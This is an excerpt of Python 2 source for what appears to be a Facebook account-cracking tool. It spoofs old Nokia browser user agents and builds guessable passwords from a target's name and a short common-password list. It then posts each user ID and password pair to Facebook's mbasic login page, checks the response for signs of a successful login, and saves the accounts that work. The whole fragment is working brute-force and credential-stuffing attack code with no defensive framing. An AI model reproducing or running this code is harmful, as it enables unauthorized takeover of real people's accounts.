...
uai = "Nokia200/2.0 (11.81) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-US; nokia200) U2/1.0.0 UCBrowser/8.8.1.252 U2/1.0.0"
uas = random.choice(["NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)"])
id = []
cp = []
ok = []
loop = 0
...
def pilih_menumbasic():
    ...
    def main(arg):
        ...
        try:
            for pw in [name.lower(),name.lower()+'1234',name.lower()+'12345',name.lower()+'123','bangsat','sayang','anjing','kontol','123456']:
...
def manualmbasic():
    ...
    def main(arg):
        ...
        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email':uid,'pass':asu,'login':'submit'}, headers={'user-agent':uai})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r [OK] ' + uid + '|' + asu + '    '
                    ok.append(uid + ' | ' + asu)
